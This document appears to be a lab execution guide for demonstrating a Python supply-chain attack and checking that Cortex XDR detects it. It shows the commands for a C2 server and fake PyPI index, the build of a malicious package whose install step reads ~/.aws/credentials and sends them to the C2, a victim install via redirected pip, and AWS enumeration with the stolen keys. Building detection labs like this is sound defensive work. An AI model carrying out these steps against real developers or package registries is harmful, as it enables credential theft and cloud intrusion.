# Supply Chain Attack Demo - Step-by-Step Execution Guide

## Lab Environment Requirements

**Three machines:**
1. **C2 Server** (Fake WAN) - Attacker infrastructure
2. **Victim Endpoint** (Windows/Linux) - Developer machine with Cortex XDR
3. **AWS Account** - Cloud environment to enumerate

---

## 📋 PRE-DEPLOYMENT: Package This Project

On your current machine (where you're building the project):

```bash
cd /Users/mabutbul/python-pack
tar -czf python-pack-demo.tar.gz \
  README.md \
  EXECUTION_GUIDE.md \
  1-attacker-infrastructure/ \
  2-malicious-package/ \
  3-victim-application/ \
  4-attacker-operations/ \
  5-aws-infrastructure/
```

Transfer `python-pack-demo.tar.gz` to your lab machines.

---

## 🎯 STEP-BY-STEP EXECUTION

### STEP 1: Setup C2 Server (Attacker Infrastructure - Fake WAN)

**Machine:** C2 Server in fake WAN network

> ⚠️ **Note:** The C2 server uses ports 80 (PyPI) and 443 (C2 exfiltration). These are privileged ports that require `sudo`/root access to bind.

**Commands:**
```bash
# Extract project
cd ~
tar -xzf python-pack-demo.tar.gz
cd python-pack/1-attacker-infrastructure

# Make scripts executable
chmod +x start_infrastructure.sh

# Start C2 server (will run in foreground — requires sudo for ports 80/443)
sudo ./start_infrastructure.sh
```

**Expected Output:**
```
[PyPI] Package server listening on port 80
[PyPI] Serving packages from: /path/to/packages
[C2] Credential receiver listening on port 443
[C2] Waiting for stolen AWS credentials...
```

**Note the C2 Server IP** - You'll need this for next steps
Example: `192.168.100.50`

**Keep this terminal open** - The server needs to keep running

---

### STEP 2: Build and Upload Malicious Package

**Machine:** C2 Server (open NEW terminal)

**Commands:**
```bash
cd ~/python-pack/2-malicious-package

# Make script executable
chmod +x build_and_upload.sh

# Build package with your C2 IP
./build_and_upload.sh 192.168.100.50
# Replace 192.168.100.50 with your actual C2 IP
```

**Expected Output:**
```
[*] Building package...
[*] Uploading package to PyPI server...
[SUCCESS] Package built and uploaded!

Package available at:
  http://192.168.100.50/simple/aws-data-utils/
```

**Verify:** Check that the C2 server terminal shows PyPI is serving files

---

### STEP 3: Setup AWS Restricted User

**Machine:** Any machine with AWS CLI configured (can be C2 server or your workstation)

**Commands:**
```bash
cd ~/python-pack/5-aws-infrastructure

# Make script executable
chmod +x setup_aws.sh

# Create restricted IAM user
./setup_aws.sh
```

**Expected Output:**
```
[SUCCESS] AWS Infrastructure Setup Complete!

Access Key ID:     AKIAXXXXXXXXXXXXXXXX
Secret Access Key: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

[+] Credentials saved to: demo_aws_credentials
```

**Important:** Save the file `demo_aws_credentials` - you'll need to copy it to the victim endpoint

---

### STEP 4: Setup Victim Endpoint

**Machine:** Victim Windows/Linux machine with Cortex XDR installed

**Commands:**
```bash
# Extract project on victim machine
cd ~
tar -xzf python-pack-demo.tar.gz
cd python-pack

# Copy AWS credentials to victim
mkdir -p ~/.aws
cp 5-aws-infrastructure/demo_aws_credentials ~/.aws/credentials
# Or manually copy from Step 3 if running on different machine

# Configure victim to use attacker's PyPI
cd 3-victim-application
chmod +x setup_victim.sh
./setup_victim.sh 192.168.100.50
# Replace with your C2 IP
```

**Expected Output:**
```
[SUCCESS] Victim endpoint configured!

⚠️  CORTEX XDR NOTE:
  The following actions should trigger XDR detections:
  1. pip install connecting to unusual IP
  2. Python accessing ~/.aws/credentials during install
  3. Outbound connection to C2 server during install
  4. Python importing package (runtime exfiltration)
```

---

### STEP 5: Trigger the Attack (Victim Installs Malicious Package)

**Machine:** Victim endpoint

⚠️ **CORTEX XDR CHECKPOINT:** Start monitoring XDR console NOW

**Commands:**
```bash
cd ~/python-pack/3-victim-application

# Set pip to use attacker's PyPI server
export PIP_CONFIG_FILE=$(pwd)/.pip/pip.conf

# Install dependencies (triggers credential theft)
pip install -r requirements.txt
```

**Expected Output:**
```
Looking in indexes: http://192.168.100.50/simple/
Collecting aws-data-utils>=1.2.0
  Downloading http://192.168.100.50/simple/aws-data-utils/aws-data-utils-1.2.3.tar.gz
...
Successfully installed aws-data-utils-1.2.3 boto3-... requests-...
```

**What happens behind the scenes:**
1. pip downloads package from attacker's PyPI server
2. setup.py executes during installation
3. Reads `~/.aws/credentials`
4. Sends credentials to C2 server (port 443)

**Check C2 Server Terminal** - You should see:
```
[+] Connection from 192.168.1.100:54321
[+] AWS Credentials stolen from 192.168.1.100!
[+] Access Key ID: AKIAXXXXXXXXXXXXXXXX
[SUCCESS] Credentials ready for cloud attack phase!
```

---

### STEP 6: (Optional) Run Victim Application - Runtime Exfiltration

**Machine:** Victim endpoint

**Commands:**
```bash
cd ~/python-pack/3-victim-application
python3 app.py
```

**Expected Output:**
```
============================================================
  Data Processing Application
============================================================

[App] Starting data processing application...
[App] Processing data from bucket: my-data-bucket
[App] File key: data/file.csv
[App] Found X S3 buckets
```

**What happens:** When the app imports `aws_data_utils`, it also checks for environment variables and sends any additional credentials found

---

### STEP 7: Execute Cloud Attack (Attacker Enumerates AWS)

**Machine:** C2 Server (attacker perspective)

⚠️ **CORTEX XDR CHECKPOINT:** This should trigger cloud enumeration alerts

**Commands:**
```bash
cd ~/python-pack/4-attacker-operations

# Make script executable
chmod +x run_attack.sh

# Execute AWS enumeration with stolen credentials
./run_attack.sh
```

**Expected Output:**
```
======================================================================
  AWS CLOUD ENUMERATION - Using Stolen Credentials
======================================================================

[+] Using stolen credentials from: ../1-attacker-infrastructure/stolen_aws_credentials
[*] Verifying stolen credentials...
[+] Credentials valid!
    Account: 123456789012
    User ARN: arn:aws:iam::123456789012:user/cortex-xdr-demo-restricted
    
======================================================================
[Phase 1] IAM Enumeration
======================================================================
[+] Found X IAM users:
    - user1 (Created: 2024-01-01)
    - user2 (Created: 2024-01-15)
    
======================================================================
[Phase 2] S3 Enumeration
======================================================================
[+] Found X S3 buckets:
    [Bucket] my-bucket-name
             Region: us-east-1
             Objects: 5
             
... (continues with EC2, Lambda, RDS enumeration) ...

[SUCCESS] AWS Enumeration Complete
```

---

## 🎯 CORTEX XDR DETECTION CHECKPOINTS

### Detection Point 1: Package Installation (Step 5)
**Look for:**
- Suspicious network connection during `pip install`
- Python process accessing `~/.aws/credentials`
- Outbound connection to unusual IP (C2 server)
- File access anomaly

### Detection Point 2: Runtime Execution (Step 6)
**Look for:**
- Python process making network connections
- Suspicious module import behavior

### Detection Point 3: Cloud Enumeration (Step 7)
**Look for:**
- High-volume AWS API calls from C2 IP
- Enumeration pattern across multiple AWS services
- Unauthorized API access from non-standard source
- IAM, S3, EC2, Lambda, RDS enumeration activity

---

## 🧹 CLEANUP

### On Victim Endpoint:
```bash
# Uninstall malicious package
pip uninstall aws-data-utils -y

# Remove AWS credentials (optional - keep for future demos)
rm ~/.aws/credentials

# Remove project files
rm -rf ~/python-pack
```

### On C2 Server:
```bash
# Stop C2 server (Ctrl+C in the running terminal)

# Clean up stolen credentials
cd ~/python-pack/1-attacker-infrastructure
rm -f stolen_*
rm -f packages/simple/aws-data-utils/*.tar.gz
rm -f packages/simple/aws-data-utils/*.whl

# Remove project (optional)
rm -rf ~/python-pack
```

### AWS Cleanup (Optional):
```bash
# List access keys for the demo user
aws iam list-access-keys --user-name cortex-xdr-demo-restricted

# Delete access key (replace with actual key ID)
aws iam delete-access-key --user-name cortex-xdr-demo-restricted --access-key-id AKIAXXXXXXXXXXXXXXXX

# Detach policy
aws iam detach-user-policy \
  --user-name cortex-xdr-demo-restricted \
  --policy-arn arn:aws:iam::ACCOUNT_ID:policy/CortexXDRDemoReadOnlyPolicy

# Delete user
aws iam delete-user --user-name cortex-xdr-demo-restricted

# Delete policy (optional)
aws iam delete-policy \
  --policy-arn arn:aws:iam::ACCOUNT_ID:policy/CortexXDRDemoReadOnlyPolicy
```

---

## 📝 QUICK REFERENCE

### C2 Server IP
**Your C2 IP:** `___________________` (fill this in)

### Key Files
- **C2 stolen credentials:** `1-attacker-infrastructure/stolen_aws_credentials`
- **Victim AWS credentials:** `~/.aws/credentials`
- **Malicious package:** `1-attacker-infrastructure/packages/simple/aws-data-utils/`

### Ports Used
- **80:** PyPI server (malicious package hosting)
- **443:** C2 server (credential exfiltration)

### Timeline
1. C2 server starts → Listening for connections
2. Package builds → Available on PyPI
3. Victim installs → Credentials stolen (instant)
4. Attacker enumerates → Using stolen creds (minutes later)

---

## 🚨 TROUBLESHOOTING

### C2 server not receiving credentials
**Check:**
- C2 server is running (`ps aux | grep c2_server`)
- Firewall allows ports 443 and 80
- Victim can reach C2 IP (`ping C2_IP`)
- Build script used correct C2 IP

### pip can't find package
**Check:**
- PyPI server is running on port 80
- Visit `http://C2_IP/simple/` in browser
- Victim's pip.conf has correct C2 IP
- Package was built and uploaded successfully

### AWS enumeration fails
**Check:**
- Credentials were stolen (check C2 terminal)
- File exists: `1-attacker-infrastructure/stolen_aws_credentials`
- IAM user has correct permissions
- AWS credentials on victim were valid

---

## ✅ SUCCESS CRITERIA

- ✅ C2 server receives stolen credentials
- ✅ Cortex XDR alerts on package installation
- ✅ Cortex XDR alerts on credential file access
- ✅ Cortex XDR alerts on C2 connection
- ✅ Cortex XDR alerts on AWS enumeration
- ✅ AWS enumeration completes successfully

**End of Execution Guide**
